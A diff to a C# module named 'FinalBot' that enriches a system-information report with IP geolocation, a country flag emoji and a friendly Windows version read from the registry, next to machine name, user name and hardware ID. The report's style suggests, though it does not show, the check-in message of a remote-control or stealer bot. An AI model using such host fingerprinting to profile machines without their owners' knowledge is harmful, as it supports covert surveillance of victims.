@@ -4,6 +4,9 @@ using System.Net;
 using System.Text;
 using System.Runtime.InteropServices;
 using Microsoft.Win32;
+using System.Net.Http;
+using Newtonsoft.Json.Linq;
+using System.Linq;
 
 namespace FinalBot.Modules
 {
@@ -37,13 +40,68 @@ namespace FinalBot.Modules
             sb.AppendLine("📋 *SYSTEM INFORMATION*");
             sb.AppendLine($"🏁 *PC:* {Environment.MachineName}");
             sb.AppendLine($"👤 *User:* {Environment.UserName}");
-            sb.AppendLine($"🌐 *OS:* {Environment.OSVersion}");
+            sb.AppendLine($"🌐 *OS:* {GetFriendlyOSName()}");
             sb.AppendLine($"🆔 *HWID:* {GetHWID()}");
-            sb.AppendLine($"📡 *IP:* {GetExternalIP()}");
+            var (ip, country, flag) = GetCountryInfo();
+            sb.AppendLine($"📡 *IP:* {ip} {flag} {country}");
             sb.AppendLine($"🔋 *CPU:* {GetCPUName()}");
             sb.AppendLine($"🧠 *RAM:* {GetTotalRAM()} GB");
 
             return sb.ToString();
+        }
+
+        public static (string ip, string country, string flag) GetCountryInfo()
+        {
+            try
+            {
+                using (var client = new HttpClient())
+                {
+                    client.Timeout = TimeSpan.FromSeconds(5);
+                    var response = client.GetStringAsync("http://ip-api.com/json/").Result;
+                    var json = JObject.Parse(response);
+                    string ip = json["query"]?.ToString() ?? "Unknown";
+                    string country = json["country"]?.ToString() ?? "Unknown";
+                    string countryCode = json["countryCode"]?.ToString()?.ToLower() ?? "";
+                    
+                    string flag = !string.IsNullOrEmpty(countryCode) ? GetFlagEmoji(countryCode) : "🏳️";
+                    return (ip, country, flag);
+                }
+            }
+            catch { return ("Unknown", "Unknown", "🏳️"); }
+        }
+
+        private static string GetFlagEmoji(string countryCode)
+        {
+            if (countryCode.Length != 2) return "🏳️";
+            int firstChar = countryCode[0] - 'a' + 0x1F1E6;
+            int secondChar = countryCode[1] - 'a' + 0x1F1E6;
+            return char.ConvertFromUtf32(firstChar) + char.ConvertFromUtf32(secondChar);
+        }
+
+        public static string GetFriendlyOSName()
+        {
+            try
+            {
+                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
+                {
+                    if (key != null)
+                    {
+                        var productName = key.GetValue("ProductName");
+                        var displayVersion = key.GetValue("DisplayVersion") ?? key.GetValue("ReleaseId");
+                        if (productName != null)
+                        {
+                            string os = productName.ToString();
+                            // Fix Windows 10 reporting as 11 in some registry keys
+                            if (os.Contains("Windows 10") && Environment.OSVersion.Version.Build >= 22000)
+                                os = os.Replace("Windows 10", "Windows 11");
+                            
+                            return displayVersion != null ? $"{os} ({displayVersion})" : os;
+                        }
+                    }
+                }
+            }
+            catch { }
+            return Environment.OSVersion.ToString();
         }
 
         public static string GetHWID()
